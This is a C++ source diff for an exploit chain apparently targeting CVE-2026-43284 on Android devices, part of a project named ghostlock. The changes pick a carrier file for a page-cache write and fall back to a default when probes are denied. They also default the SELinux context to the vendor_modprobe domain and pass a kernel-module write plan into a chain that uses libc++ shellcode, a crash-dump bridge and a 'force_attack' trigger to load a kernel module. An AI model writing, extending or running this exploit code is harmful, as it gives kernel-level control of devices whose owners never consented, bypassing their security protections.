@@ -13,6 +13,7 @@
 #include "profile/schema.hpp"
 
 #include <cstddef>
+#include <cstdio>
 #include <new>
 
 namespace ghostlock::backend::cve_2026_43284 {
@@ -35,6 +36,49 @@ namespace ghostlock::backend::cve_2026_43284 {
         return false;
     }
 
+    bool select_single_carrier(std::optional<std::uint64_t> token,
+                               const platform::DeviceProbeOps &device,
+                               const steps::CarrierTarget *&out) noexcept {
+        out = nullptr;
+        const std::uint64_t value = token.value_or(kCarrierTokenDefault);
+        if (value != kCarrierTokenDefault) {
+            const steps::CarrierTarget *primary = nullptr;
+            std::size_t count = 0U;
+            if (!resolve_carrier_token(value, primary, count) || primary == nullptr ||
+                count != 1U) {
+                return false;
+            }
+            out = primary;
+            return true;
+        }
+        /* token 0 / absent: prefer the first default the device probe reports
+         * present. When the probe cannot confirm any of them, fall back to the
+         * first default instead of failing: the probe is a plain stat()/access()
+         * and is denied for privileged domains on some devices (the Shizuku shell
+         * domain cannot getattr vendor files here), while the chain can still
+         * reach such a carrier through the crash-dump bridge bound by patch #1.
+         * The chain itself fails closed if the chosen carrier turns out to be
+         * unusable, so an unconfirmed choice cannot silently write elsewhere. */
+        if (device.file_fact != nullptr) {
+            for (const steps::CarrierTarget &candidate : steps::kDefaultCarriers) {
+                char path[steps::kCarrierPathMaxBytes] = {};
+                const std::size_t n = candidate.path.size() < sizeof(path) - 1U
+                                              ? candidate.path.size()
+                                              : sizeof(path) - 1U;
+                for (std::size_t i = 0U; i < n; ++i) {
+                    path[i] = candidate.path[i];
+                }
+                platform::FileFact fact{};
+                if (device.file_fact(device.ctx, path, fact) && fact.exists) {
+                    out = &candidate;
+                    return true;
+                }
+            }
+        }
+        out = &steps::kDefaultCarriers[0];
+        return true;
+    }
+
     BackendTerminalResult run_backend_terminal(const Cve2026_43284Profile &profile,
                                                const terminal::RootProgram &root_program,
                                                const IpsecSaParams &sa,
@@ -50,14 +94,18 @@ namespace ghostlock::backend::cve_2026_43284 {
             result.error = BackendTerminalError::StepsMismatch;
             return result;
         }
-        if (!profile.selinux_exec_context.has_value() ||
-            profile.selinux_exec_context.value() >
-                    static_cast<std::uint64_t>(lkm::kSelinuxExecContextMax)) {
+        /* The SELinux exec context is an optional profile token whose 0 value is
+         * the standard vendor_modprobe domain (also the embedded libc++ hook's
+         * default binding), so an absent token resolves to it instead of failing
+         * the run: the production path the App drives does not need to spell out
+         * the default. Any other out-of-range value is still rejected. */
+        const std::uint64_t selinux_token = profile.selinux_exec_context.value_or(
+                static_cast<std::uint64_t>(lkm::kSelinuxExecContextVendorModprobe));
+        if (selinux_token > static_cast<std::uint64_t>(lkm::kSelinuxExecContextMax)) {
             result.error = BackendTerminalError::ProfileIncomplete;
             return result;
         }
-        const std::uint32_t selinux_context =
-                static_cast<std::uint32_t>(profile.selinux_exec_context.value());
+        const std::uint32_t selinux_context = static_cast<std::uint32_t>(selinux_token);
 
         platform::DeviceFacts facts{};
         result.fact_error = platform::collect_device_facts(deps.device, facts);
@@ -97,18 +145,17 @@ namespace ghostlock::backend::cve_2026_43284 {
             return result;
         }
 
-        const steps::CarrierTarget *primary = nullptr;
-        std::size_t primary_count = 0U;
-        if (profile.carrier_path.has_value() &&
-            !resolve_carrier_token(profile.carrier_path.value(), primary, primary_count)) {
+        /* Single-candidate carrier (B6/T5): the composition root selected and
+         * bound exactly one candidate; the chain is given that one and never
+         * falls back, so the page-cache write target, the crash_dump read bridge
+         * and the libc++ shellcode ko_target all name the same file. */
+        if (deps.carrier == nullptr || deps.carrier->path.empty()) {
             result.error = BackendTerminalError::CarrierRejected;
             return result;
         }
         steps::CarrierList carriers{};
-        if (!steps::build_carrier_list(primary, primary_count, carriers)) {
-            result.error = BackendTerminalError::CarrierRejected;
-            return result;
-        }
+        carriers.items[0] = *deps.carrier;
+        carriers.count = 1U;
 
         if (deps.precheck_lkm != nullptr && !deps.lkm_image_path.empty()) {
             /* B5-9h-3: the precheck now needs the full VERMAGIC_STRING inputs.
@@ -130,6 +177,15 @@ namespace ghostlock::backend::cve_2026_43284 {
         request.carriers = carriers.items.data();
         request.carrier_count = carriers.count;
         request.wait_timeout_ms = deps.wait_timeout_ms;
+        /* Target size from the composition root's fstat(2) of the same carrier
+         * fd; 0 == unknown keeps the carrier's declared size authoritative. */
+        request.target_size = deps.target_size;
+        /* The composition root's module write plan. A null plan leaves the
+         * request plan empty, which validate_plan_closure() rejects before any
+         * patch #1 / hook / trigger, so a missing module fails closed. */
+        if (deps.plan != nullptr) {
+            request.plan = *deps.plan;
+        }
         steps::ChainWorkspace workspace{};
         result.chain = steps::run_chain(request, deps.chain, workspace);
         if (result.chain.error != steps::ChainError::None || !result.chain.lkm_loaded) {
@@ -194,7 +250,7 @@ namespace ghostlock::backend::cve_2026_43284 {
 
 namespace ghostlock::backend {
     using ghostlock::session::CoreSession;
-    using ghostlock::session::StageResult;
+    using ghostlock::contract::StageResult;
 
     profile::BindStatus Cve2026_43284Policy::state_from(
             CoreSession &session, const profile::Document &document) {
@@ -223,6 +279,17 @@ namespace ghostlock::backend {
         const cve_2026_43284::BackendTerminalResult result =
                 cve_2026_43284::run_backend_terminal(state.profile, state.root_program,
                                                     state.sa, state.deps, force_attack, out);
+        if (!result.ready) {
+            /* A silent Failed leaves the App with no diagnosis; name the reason. */
+            (void)std::fprintf(stderr,
+                               "cve_2026_43284 backend failed: error=%d fact_error=%d "
+                               "lkm_error=%d image_error=%d\n",
+                               static_cast<int>(result.error),
+                               static_cast<int>(result.fact_error),
+                               static_cast<int>(result.lkm_error),
+                               static_cast<int>(result.image_error));
+            (void)std::fflush(stderr);
+        }
         return result.ready ? StageResult::Continue : StageResult::Failed;
     }
 } // namespace ghostlock::backend
